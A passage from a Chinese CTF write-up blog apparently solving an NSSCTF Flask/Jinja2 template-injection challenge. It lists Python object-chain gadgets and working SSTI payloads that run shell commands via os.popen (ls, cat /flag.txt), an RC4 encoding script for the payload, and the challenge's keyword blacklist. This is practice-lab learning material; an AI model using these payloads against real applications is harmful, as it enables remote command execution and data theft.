+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112164326132.png" alt="image-20230112164326132"></p>
+<p>而很常用的<code>popen</code>函数，就会在某个类里存在，那么就需要去寻找，比如在<code>python3</code>里面有<code>&#39;abc&#39;.__class__.__base__.__subclasses__()[134].__init__.__globals__[&#39;popen&#39;]</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112164500524.png" alt="image-20230112164500524"></p>
+<p>那么对应传入参数就可以执行函数了，常用形式如下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;abc&#x27;.__class__.__base__.__subclasses__()[134].__init__.__globals__[&#x27;popen&#x27;](&#x27;ipconfig&#x27;).read()</span><br></pre></td></tr></table></div></figure>
+
+<p>这些相关常用属性也有相关总结，参考：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/zbbjya/article/details/124185476" >(48条消息) SSTI知识点与题型_zbbjya的博客-CSDN博客_ssti大全</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#python2" >python 沙箱逃逸与SSTI ~ Misaki’s Blog (misakikata.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a/b)</span><br><span class="line">request.json		 post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="题目-1"   >
+          <a href="#题目-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2>
+      <p>那么有了前置知识，这个就很好做了，利用相关的<code>payload</code>即可，在<code>flask</code>中有一个很常用的<code>config</code></p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&#123;&#123;config&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112165239719.png" alt="image-20230112165239719"></p>
+<p>上面总结也有提到，如下<code>payload</code></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()</span><br></pre></td></tr></table></div></figure>
+
+<p>但是这里还存在一个<code>rc4</code>加解密，使用不知道哪位师傅的脚本即可解决</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="comment">#print(&quot;加密后的字符串是：\n%s&quot; %cipher)</span></span><br><span class="line">    enc_url = parse.quote(cipher)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的url编码:\n&quot;</span> + enc_url)</span><br><span class="line">    <span class="comment">#print(&quot;加密后的输出(经过base64编码):&quot;)</span></span><br><span class="line">    <span class="comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&#x27;&#x27;&#x27;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="题外话"   >
+          <a href="#题外话" class="heading-link"><i class="fas fa-link"></i></a><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2>
+      <p>在获取到网站源码之后，发现其实是有黑名单过滤的</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe</span>(<span class="params">s</span>):</span></span><br><span class="line">        black=[<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>,  <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;join&#x27;</span> <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;del&#x27;</span>, <span class="string">&#x27;rm&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>, <span class="string">&#x27;catch_warnings&#x27;</span>, <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;reload&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;kill&#x27;</span>, <span class="string">&#x27;func_code&#x27;</span> ]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> black:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span>+ i +<span class="string">&#x27;\&#x27; is not allowed. Secret is &#x27;</span> + s</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    secret=request.args.get(<span class="string">&#x27;secret&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></div></figure>
+
+<p>但是他这个过滤，其实只是给我们的输入加了一些字符，比如里面有<code>class</code>，就会变成<code>&#39;class&#39; is not allowed. Secret is xxxx</code>，而在<code>jinja2</code>里，对于普通的字符，即不符合语法规则的字符，是会原样输出的，比如如下代码</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;1234213&#123;&#123;&#x27;abc&#x27;.__class__.__base__.__subclasses__()[134].__init__.__globals__[&#x27;popen&#x27;](&#x27;ipconfig&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>
+
+<p>访问结果如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112170040620.png" alt="image-20230112170040620"></p>
+<p>其实对于代码执行一点影响没有，相当于只是一个网站的文本字符而已。</p>
+<p>最终<code>payload</code>如下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></div></figure>
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2023/03/09/NSSCTF-Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/">http://pig-007.github.io/2023/03/09/NSSCTF-Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/NSSCTF/">NSSCTF</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/04/01/kernel%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%AC%94%E8%AE%B0/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Linux内核内存分配笔记</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/03/07/VulHub%E5%88%B7%E9%A2%98/"><span class="paginator-prev__text">Vulhub刷题</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-jicao"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]jicao</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]Do_you_know_http</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-gift-F12"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]gift_F12</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP"><span class="toc-text">
+          [第五空间 2021]WebFTP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easy-md5"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]easy_md5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-include"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]PseudoProtocols</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NISACTF-2022-easyssrf"><span class="toc-text">
+          [NISACTF 2022]easyssrf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]ez_unserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]no_wakeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-text">
+          [ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]pop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NISACTF-2022-babyserialize"><span class="toc-text">
+          [NISACTF 2022]babyserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyupload1-0"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]easyupload1.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyupload2-0"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]easyupload2.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyupload3-0"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]easyupload3.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-caidao"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]caidao</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyrce"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]easyrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyrce"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]babyrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]hardrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]finalrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easy-sql"><span class="toc-text">
+          [SWPUCTF 2021 新生赛]easy_sql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">
+          前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E7%B1%BB%E5%9E%8B"><span class="toc-text">
+          1.判断类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%AD%97%E6%AE%B5%E6%95%B0%E6%9F%A5%E8%AF%A2"><span class="toc-text">
+          2.字段数查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%9B%9E%E6%98%BE%E7%82%B9%E6%9F%A5%E8%AF%A2"><span class="toc-text">
+          3.回显点查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#select-1-2-3"><span class="toc-text">
+          select 1,2,3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">
+          结合查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9F%A5%E8%AF%A2%E5%BA%93%E5%90%8D"><span class="toc-text">
+          4.查询库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="toc-text">
+          5.查询表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-text">
+          6.查询字段名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-text">
+          7.查询数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP"><span class="toc-text">
+          SQLMAP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web11"><span class="toc-text">
+          [CISCN 2019华东南]Web11</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-1"><span class="toc-text">
+          前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-text">
+          前期调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%88%9B%E5%BB%BA"><span class="toc-text">
+          模板创建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E8%B0%83%E7%94%A8"><span class="toc-text">
+          模板调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%B1%BB%E6%A8%A1%E6%9D%BF"><span class="toc-text">
+          其他类模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%A2%E5%BC%8F"><span class="toc-text">
+          漏洞形式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-text">
+          题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NISACTF-2022-midlevel"><span class="toc-text">
+          [NISACTF 2022]midlevel</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NISACTF-2022-is-secret"><span class="toc-text">
+          [NISACTF 2022]is secret</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2"><span class="toc-text">
+          前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-text">
+          题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E5%A4%96%E8%AF%9D"><span class="toc-text">
+          题外话</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">133</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">83</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">73</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
